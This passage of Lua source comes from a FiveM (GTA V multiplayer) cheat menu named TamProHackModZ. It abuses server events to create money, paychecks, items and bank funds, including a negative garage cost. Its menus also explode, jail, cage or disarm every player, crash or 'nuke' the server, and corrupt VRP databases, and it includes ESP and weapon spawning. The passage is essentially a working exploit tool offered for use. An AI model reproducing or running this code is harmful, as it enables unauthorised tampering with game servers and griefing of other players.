  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ ~r~ESX ~u~Rome_Menu.ez", ESXD) then  
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ ~b~ESX ~s~UNKNOWN", MSTC) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ ~b~ESX ~s~UNKNOWN", Pure) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ ~b~ESX ~s~UNKNOWN", Seller) then  
  end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(esms) then
  if TamProHackModZ.Button("All ~r~MONEY «-") then
  automaticmoneyesx()
elseif TamProHackModZ.Button("MONEY ~r~0") then
TriggerServerEvent('dbadf620-5f7c-429e-b936-5db8fa9fcb27', 10000)
elseif TamProHackModZ.Button("MONEY ~r~1") then
TriggerServerEvent('4a9b5090-3762-48e5-948b-43335f4203ca', 10000)
elseif TamProHackModZ.Button("MONEY ~r~2") then
TriggerServerEvent('87cc7dc9-c928-4ee8-8e32-11c630ee1f32', 10000)
elseif TamProHackModZ.Button("MONEY ~r~3") then
TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 10000)
TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 10000)
TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 10000)
elseif TamProHackModZ.Button("~s~Bank ~r~~h~Deposit") then
  local result = KeyboardInput("Enter amount of money", "", 100)
  if result then
  TriggerServerEvent("bank:deposit", result)
  end
elseif TamProHackModZ.Button("~s~Bank ~r~~h~Withdraw ") then
  local result = KeyboardInput("Enter amount of money", "", 100)
  if result then
  TriggerServerEvent("bank:withdraw", result)
  end
end



  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(ESXC) then
  if TamProHackModZ.Button("GOTO LEGENCY") then
    gotolegency()
elseif TamProHackModZ.Button("BRING LEGENCY") then
	bringlegency()
elseif TamProHackModZ.Button("statustext LEGENCY") then
	textlegency()
    end


  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(ESXD) then
  if TamProHackModZ.Button("~u~X ~u~ReBody") then
    hweed()
  elseif TamProHackModZ.Button("~u~Q ~u~ReBody") then
    tweed()
  elseif TamProHackModZ.Button("~u~L ~u~MaiKi") then
    sweed()
  elseif TamProHackModZ.Button("~u~K ~u~Ki") then
    hcoke()
  elseif TamProHackModZ.Button("~u~ALT ~u~Mailock") then
    tcoke()
  elseif TamProHackModZ.Button("~u~Heal~u~100") then
    scoke()
  elseif TamProHackModZ.Button("~u~Bomb~u~Server") then
    hmeth()
  elseif TamProHackModZ.Button("~u~E~u~Lock") then
    tmeth()
  elseif TamProHackModZ.Button("~u~Give~u~Car") then
    smeth()
  elseif TamProHackModZ.Button("~u~Uber") then
    hopi()
  elseif TamProHackModZ.Button("~u~Weapon Spawn") then
    topi()
  elseif TamProHackModZ.Button("~u~Invislible") then
    sopi()
  elseif TamProHackModZ.Button("~u~Hydra") then
    mataaspalarufe()
  elseif TamProHackModZ.Button("~u~Costum") then
    matanumaispalarufe()
  elseif TamProHackModZ.CheckBox("~r~UNKNOWN9",BlowDrugsUp,function(enabled)BlowDrugsUp = enabled end) then
  end


  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(VRPT) then
  if TamProHackModZ.Button("~r~VRP ~s~Give Money ~ypayGarage") then
    local result = KeyboardInput("Enter amount of money", "", 100)
    if result ~= "" then
      TSE("lscustoms:payGarage", {costs = -result})
    end
  elseif TamProHackModZ.Button("~r~VRP ~g~PayCheck Abuse") then
    local v = KeyboardInput("How many times?", "", 100)
    if v ~= "" then
      for i = 0,v do
        TSE('paychecks:bonus')
        TSE('paycheck:bonus')
      end
    else
      notify("~b~Invalid amount~s~.", false)
    end
  elseif TamProHackModZ.Button("~r~VRP ~g~SalaryPay Abuse","You need a job!") then
    local v = KeyboardInput("How many times?", "", 100)
    if v ~= "" then
      for i = 0,v do
        TSE('paychecks:salary')
        TSE('paycheck:salary')
      end
    else
      notify("~b~Invalid amount~s~.", false)
    end
  elseif TamProHackModZ.Button("~r~VRP ~g~WIN ~s~Slot Machine") then
    local result = KeyboardInput("Enter amount of money", "", 100)
    if result ~= "" then
      TSE("vrp_slotmachine:server:2",result)
    end
  elseif TamProHackModZ.Button("~r~VRP ~s~Get driving license") then
    TSE("dmv:success")
  elseif TamProHackModZ.Button("~r~VRP ~s~Bank Deposit") then
    local result = KeyboardInput("Enter amount of money", "", 100)
    if result ~= "" then
      TSE("Banca:deposit", result)
      TSE("bank:deposit", result)
    end
  elseif TamProHackModZ.Button("~r~VRP ~s~Bank Withdraw ") then
    local result = KeyboardInput("Enter amount of money", "", 100)
    if result ~= "" then
      TSE("bank:withdraw", result)
      TSE("Banca:withdraw", result)
    end
  end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(Pure) then
  if TamProHackModZ.Button("TEST BT") then
    toppp()
  end

    TamProHackModZ.Display()
    elseif TamProHackModZ.IsMenuOpened(Seller) then
    if TamProHackModZ.Button("Milli Item Getting") then
    local result = KeyboardInput("Miili Item Name", "", 100000000)
    if result then
      TriggerServerEvent("TWENTY2_afkZone:addItemAFK", "item", result, 1)

  end
  end  

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(MSTC) then
  if TamProHackModZ.Button("Open Head Name") then
    
end
  
  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(advm) then
  if TamProHackModZ.CheckBox("~y~Jesus~s~Mode", dio, function(enabled) dio = enabled end) then
  elseif TamProHackModZ.ComboBox("~y~Jesus~s~Mode Radius", JesusRadiusOps, currJesusRadiusIndex, selJesusRadiusIndex, function(currentIndex, selectedIndex)
    currJesusRadiusIndex = currentIndex
    selJesusRadiusIndex = currentIndex
    JesusRadius = JesusRadiusOps[currentIndex]
  end) then
    elseif TamProHackModZ.CheckBox("Magnet ~r~Boy", magnet, function(enabled) MagnetoBoy() end) then
    end

    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(CMSMS) then
    if TamProHackModZ.CheckBox("~y~Original ~s~Crosshair", crosshair, function (enabled) crosshair = enabled crosshairc = false crosshairc2 = false end) then
    elseif TamProHackModZ.CheckBox("~r~CROSS ~s~Crosshair", crosshairc, function (enabled) crosshair = false crosshairc = enabled crosshairc2 = false end) then
    elseif TamProHackModZ.CheckBox("~r~DOT ~s~Crosshair", crosshairc2, function (enabled) crosshair = false crosshairc = false crosshairc2 = enabled end) then
    end

    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(GAPA) then
    if TamProHackModZ.Button("~r~Jail~s~ All players") then
      jailall()
    elseif TamProHackModZ.Button("~r~Banana ~p~Party~s~ All players") then
      bananapartyall()
    elseif TamProHackModZ.Button("~r~Cage~s~ All players") then
      cageall()
    elseif TamProHackModZ.Button("~r~BORGAR~s~ All players") then
      borgarall()
    elseif TamProHackModZ.Button("~r~Explode~s~ All players") then
      explodeall()
    elseif TamProHackModZ.Button("~r~Give Weapons to~s~ All players") then
    weaponsall()
    elseif TamProHackModZ.CheckBox( "~r~Handcuff~s~ All players", freezeall, function(enabled) freezeall = enabled end) then
          elseif TamProHackModZ.CheckBox( "~r~Disable~s~ All Cars", cardz, function(enabled) cardz = enabled end) then
          elseif TamProHackModZ.CheckBox( "~r~Disable~s~ All Guns", gundz, function(enabled) gundz = enabled end) then
    end

    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(dddd) then
    if TamProHackModZ.Button("~r~Nuke ~s~Server") then
      nukeserver()
    elseif TamProHackModZ.CheckBox( "~r~Silent ~s~Server ~y~Crasher", servercrasherxd, function(enabled) servercrasherxd = enabled end) then
    elseif TamProHackModZ.Button("~g~ESX ~r~Destroy ~r~v3") then
      esxdestroyv3()
    elseif TamProHackModZ.Button("~g~VRP ~r~Destroy ~r~V1") then
    vrpdestroy()
  elseif TamProHackModZ.CheckBox( "~g~VRP ~r~Database Crasher", vrpdbc, function(enabled) vrpdbc = enabled end) then
        elseif TamProHackModZ.CheckBox( "~g~GCPhone ~r~Destroy", gcphonedestroy, function(enabled) gcphonedestroy = enabled end) then
        elseif TamProHackModZ.Button("~r~Rampinator LOL") then
          for vehicle in EnumerateVehicles() do
local ramp = CreateObject(-145066854, 0, 0, 0, true, true, true)
NetworkRequestControlOfEntity(vehicle)
AttachEntityToEntity(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
NetworkRequestControlOfEntity(ramp)
SetEntityAsMissionEntity(ramp, true, true)
          end
  end

    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(crds) then
    if TamProHackModZ.Button("<FONT COLOR='#F6B352'>#~s~ nit34byte~r~#~r~1337"," ~p~DEV") then
    end

    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(WTNe) then
    for k, v in pairs(l_weapons) do
      if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ "..k, WTSbull) then
        WeaponTypeSelect = v
      end
    end
    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(WTSbull) then
    for k, v in pairs(WeaponTypeSelect) do
      if TamProHackModZ.MenuButton(v.name, WOP) then
        WeaponSelected = v
      end
    end
    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(WOP) then
    if TamProHackModZ.Button("~r~Spawn Weapon") then
      GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), 1000, false)
    end
    if TamProHackModZ.Button("~g~Add Ammo") then
      SetPedAmmo(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), 5000)
    end
    if TamProHackModZ.CheckBox("~r~Infinite ~s~Ammo", WeaponSelected.bInfAmmo, function(s)
    end) then
      WeaponSelected.bInfAmmo = not WeaponSelected.bInfAmmo
      SetPedInfiniteAmmo(GetPlayerPed(-1), WeaponSelected.bInfAmmo, GetHashKey(WeaponSelected.id))
      SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
      PedSkipNextReloading(GetPlayerPed(-1))
      SetPedShootRate(GetPlayerPed(-1), 1000)
    end
    for k, v in pairs(WeaponSelected.mods) do
      if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ ~r~> ~s~"..k, MSMSA) then
        ModSelected = v
      end
    end
    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(MSMSA) then
    for _, v in pairs(ModSelected) do
      if TamProHackModZ.Button(v.name) then
        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), GetHashKey(v.id));
      end
    end

    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(CTSa) then
    for i, aName in ipairs(CarTypes) do
      if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ "..aName, CTS) then
        carTypeIdx = i
      end
    end
    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(CTS) then
    for i, aName in ipairs(CarsArray[carTypeIdx]) do
      if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ ~r~>~s~ "..aName, cAoP) then
        carToSpawn = i
      end
    end
    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(cAoP) then
    if TamProHackModZ.CheckBox("~g~Spawn inside", spawninside, function(enabled) spawninside = enabled end) then
    elseif TamProHackModZ.Button("~r~Spawn Car") then
      local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
      local veh = CarsArray[carTypeIdx][carToSpawn]
      if veh == nil then
        veh = "adder"
      end
      vehiclehash = GetHashKey(veh)
      RequestModel(vehiclehash)

      Citizen.CreateThread(function()
      local waiting = 0
      while not HasModelLoaded(vehiclehash) do
        waiting = waiting + 100
        Citizen.Wait(100)
        if waiting > 5000 then
          ShowNotification("~r~Cannot spawn this vehicle.")
          break
        end
      end
      SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1))+90, 1, 0)
      SetVehicleStrong(SpawnedCar, true)
      SetVehicleEngineOn(SpawnedCar, true, true, false)
      SetVehicleEngineCanDegrade(SpawnedCar, false)
      if spawninside then
        SetPedIntoVehicle(PlayerPedId(-1), SpawnedCar, -1)
      end
      end)
    end

    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(MTSS) then
    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
      for i, aName in ipairs(Trailers) do
        if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ ~r~>~s~ "..aName, CTSmtsps) then
          TrailerToSpawn = i
        end
      end
    else
      notify("~w~Not in a vehicle", true)
    end
    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(CTSmtsps) then
    if TamProHackModZ.Button("~r~Spawn Car") then
      local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
      local veh = Trailers[TrailerToSpawn]
      if veh == nil then veh = "adder" end
      vehiclehash = GetHashKey(veh)
      RequestModel(vehiclehash)

      Citizen.CreateThread(function()
      local waiting = 0
      while not HasModelLoaded(vehiclehash) do
        waiting = waiting + 100
        Citizen.Wait(100)
        if waiting > 5000 then
          ShowNotification("~r~Cannot spawn this vehicle.")
          break
        end
      end
      local SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1))+90, 1, 0)
      local UserCar = GetVehiclePedIsUsing(GetPlayerPed(-1))
      AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0)
      SetVehicleStrong(SpawnedCar, true)
      SetVehicleEngineOn(SpawnedCar, true, true, false)
      SetVehicleEngineCanDegrade(SpawnedCar, false)
      end)
    end

    TamProHackModZ.Display()
  	elseif TamProHackModZ.IsMenuOpened(GSWP) then
    for i = 1, #allWeapons do
      if TamProHackModZ.Button(allWeapons[i]) then
        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
      end
    end

    TamProHackModZ.Display()
	elseif TamProHackModZ.IsMenuOpened(Repair) then
    if TamProHackModZ.Button("Repairkit (x5)") then
        TriggerServerEvent('esx_policejob:getrepairkit')
        TriggerServerEvent('esx_policejob:getrepairkit')
        TriggerServerEvent('esx_policejob:getrepairkit')
        TriggerServerEvent('esx_policejob:getrepairkit')
        TriggerServerEvent('esx_policejob:getrepairkit')
    elseif TamProHackModZ.Button("Harvest Fixkit (x5") then
        TriggerServerEvent('esx_mechanicjob:startHarvest')
        TriggerServerEvent('esx_mechanicjob:startHarvest')
        TriggerServerEvent('esx_mechanicjob:startHarvest')
        TriggerServerEvent('esx_mechanicjob:startHarvest')
        TriggerServerEvent('esx_mechanicjob:startHarvest')
    elseif TamProHackModZ.Button("Harvest Fixkit (x5") then
        TriggerServerEvent('esx_mechanicjob:startCraft')
        TriggerServerEvent('esx_mechanicjob:startCraft')
        TriggerServerEvent('esx_mechanicjob:startCraft')
        TriggerServerEvent('esx_mechanicjob:startCraft')
        TriggerServerEvent('esx_mechanicjob:startCraft')
    elseif TamProHackModZ.Button("Harvest Fixkit (x5") then
        TriggerServerEvent('esx_mechanicjob:startHarvest2')
        TriggerServerEvent('esx_mechanicjob:startHarvest2')
        TriggerServerEvent('esx_mechanicjob:startHarvest2')
        TriggerServerEvent('esx_mechanicjob:startHarvest2')
        TriggerServerEvent('esx_mechanicjob:startHarvest2')
    elseif TamProHackModZ.Button("Craft Fixkit(x5") then
        TriggerServerEvent('esx_mechanicjob:startCraft2')
        TriggerServerEvent('esx_mechanicjob:startCraft2')
        TriggerServerEvent('esx_mechanicjob:startCraft2')
        TriggerServerEvent('esx_mechanicjob:startCraft2')
        TriggerServerEvent('esx_mechanicjob:startCraft2')
    elseif TamProHackModZ.Button("Harvest Fixkit (x5") then
        TriggerServerEvent('esx_mechanicjob:startHarvest3')
        TriggerServerEvent('esx_mechanicjob:startHarvest3')
        TriggerServerEvent('esx_mechanicjob:startHarvest3')
        TriggerServerEvent('esx_mechanicjob:startHarvest3')
        TriggerServerEvent('esx_mechanicjob:startHarvest3')
    elseif TamProHackModZ.Button("Harvest Fixkit (x5") then
        TriggerServerEvent('esx_mechanicjob:startCraft3')
        TriggerServerEvent('esx_mechanicjob:startCraft3')
        TriggerServerEvent('esx_mechanicjob:startCraft3')
        TriggerServerEvent('esx_mechanicjob:startCraft3')
        TriggerServerEvent('esx_mechanicjob:startCraft3')
    elseif TamProHackModZ.Button("Stpp All") then
        TriggerServerEvent('esx_mechanicjob:stopCraft')
        TriggerServerEvent('esx_mechanicjob:stopHarvest')
        TriggerServerEvent('esx_mechanicjob:stopCraft2')
        TriggerServerEvent('esx_mechanicjob:stopHarvest2')
        TriggerServerEvent('esx_mechanicjob:stopCraft3')
        TriggerServerEvent('esx_mechanicjob:stopHarvest3')
    end

    TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("AIMENU") then
    if TamProHackModZ.Button("Configure AI Speed") then
        cspeed = KeyboardInput("Enter Wanted MaxSpeed", "", 100)
        local c1 = 1.0
        cspeed = tonumber(cspeed)
        if cspeed == nil then
        drawNotification(
    '~h~~r~Invalid Speed~s~.'
)
drawNotification(
    '~h~~r~Operation cancelled~s~.'
)
        elseif cspeed then
aispeed = (cspeed .. ".0")
SetDriveTaskMaxCruiseSpeed(GetPlayerPed(-1), tonumber(aispeed))
        end
        
        SetDriverAbility(GetPlayerPed(-1), 100.0)
    elseif TamProHackModZ.Button("AI Drive (Waypoint_Slow)") then
        if DoesBlipExist(GetFirstBlipInfoId(8)) then
local blipIterator = GetBlipInfoIdIterator(8)
local blip = GetFirstBlipInfoId(8, blipIterator)
local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
local ped = GetPlayerPed(-1)
ClearPedTasks(ped)
local v = GetVehiclePedIsIn(ped, false)
TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 5, 1.0, true)
SetDriveTaskDrivingStyle(ped, 8388636)
speedmit = true
        end
    elseif TamProHackModZ.Button("AI Drive (Waypoint_Fast)") then
        if DoesBlipExist(GetFirstBlipInfoId(8)) then
local blipIterator = GetBlipInfoIdIterator(8)
local blip = GetFirstBlipInfoId(8, blipIterator)
local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
local ped = GetPlayerPed(-1)
ClearPedTasks(ped)
local v = GetVehiclePedIsIn(ped, false)
TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 2883621, 5.5, true)
SetDriveTaskDrivingStyle(ped, 2883621)
speedmit = true
        end
    elseif TamProHackModZ.Button("AI Drive (Wander)") then
        local ped = GetPlayerPed(-1)
        ClearPedTasks(ped)
        local v = GetVehiclePedIsIn(ped, false)
        print("Configured speed is currently " .. aispeed)
        TaskVehicleDriveWander(ped, v, tonumber(aispeed), 8388636)
    elseif TamProHackModZ.Button("Stop AI") then
        speedmit = false
        if IsPedInAnyVehicle(GetPlayerPed(-1)) then
ClearPedTasks(GetPlayerPed(-1))
        else
ClearPedTasksImmediately(GetPlayerPed(-1))
        end
    end

    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(espa) then
    if TamProHackModZ.CheckBox("~r~ESP ~s~MasterSwitch", esp, function(enabled) esp = enabled end) then
    elseif TamProHackModZ.CheckBox("~r~ESP ~s~Box", espbox, function(enabled) espbox = enabled end) then
    elseif TamProHackModZ.CheckBox("~r~ESP ~s~Info", espinfo, function(enabled) espinfo = enabled end) then
    elseif TamProHackModZ.CheckBox("~r~ESP ~s~Lines", esplines, function(enabled) esplines = enabled end) then
    elseif TamProHackModZ.CheckBox("Player Blips", bBlips, function(bBlips) end) then
    showblip = not showblip
    bBlips = showblip
    elseif TamProHackModZ.CheckBox("Name Above Players n Indicator", nameabove, function(enabled) nameabove = enabled end) then
    end

    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(LSCC) then
    local veh = GetVehiclePedIsUsing(PlayerPedId())
    if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ ~r~Exterior ~s~Tuning", tngns) then
    elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ ~r~Performance ~s~Tuning", prof) then
    elseif TamProHackModZ.Button("Change Car License Plate") then
      carlicenseplaterino()
    elseif TamProHackModZ.CheckBox("~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Vehicle Colour", RainbowVeh, function(enabled) RainbowVeh = enabled end) then
    elseif TamProHackModZ.Button("Make vehicle ~y~dirty") then
      Clean(GetVehiclePedIsUsing(PlayerPedId(-1)))
    elseif TamProHackModZ.Button("Make vehicle ~g~clean") then
      Clean2(GetVehiclePedIsUsing(PlayerPedId(-1)))
    elseif TamProHackModZ.CheckBox("~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Neons & Headlights", rainbowh, function(enabled) rainbowh = enabled end) then
    end


    TamProHackModZ.Display()
  elseif TamProHackModZ.IsMenuOpened(bmm) then
    if TamProHackModZ.ComboBox("Engine ~r~Power ~s~Booster", powerboost, currentItemIndex, selectedItemIndex, function(currentIndex, selectedIndex)
    currentItemIndex = currentIndex
    selectedItemIndex = selectedIndex
    SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), selectedItemIndex * 20.0)
    end) then

    elseif TamProHackModZ.CheckBox("Engine ~g~Torque ~s~Booster ~g~2x", t2x, function(enabled)
      t2x = enabled
      t4x = false
      t10x = false
      t16x = false
      txd = false
      tbxd = false
      end) then
      elseif TamProHackModZ.CheckBox("Engine ~g~Torque ~s~Booster ~g~4x", t4x, function(enabled)
        t2x = false
        t4x = enabled
        t10x = false
        t16x = false
        txd = false
        tbxd = false
        end) then
        elseif TamProHackModZ.CheckBox("Engine ~g~Torque ~s~Booster ~g~10x", t10x, function(enabled)
          t2x = false
          t4x = false
          t10x = enabled
          t16x = false
          txd = false
          tbxd = false
          end) then
          elseif TamProHackModZ.CheckBox("Engine ~g~Torque ~s~Booster ~g~16x", t16x, function(enabled)
t2x = false
t4x = false
t10x = false
t16x = enabled
txd = false
tbxd = false
end) then
elseif TamProHackModZ.CheckBox("Engine ~g~Torque ~s~Booster ~y~XD", txd, function(enabled)
  t2x = false
  t4x = false
  t10x = false
  t16x = false
  txd = enabled
  tbxd = false
  end) then
  elseif TamProHackModZ.CheckBox("Engine ~g~Torque ~s~Booster ~y~BIG XD", tbxd, function(enabled)
    t2x = false
    t4x = false
    t10x = false
    t16x = false
    txd = false
    tbxd = enabled
    end) then
end
          TamProHackModZ.Display()
        elseif IsDisabledControlPressed(0, 108) then
        TamProHackModZ.OpenMenu(HighTachMenu)
        end
      Citizen.Wait(0)
    end
end)

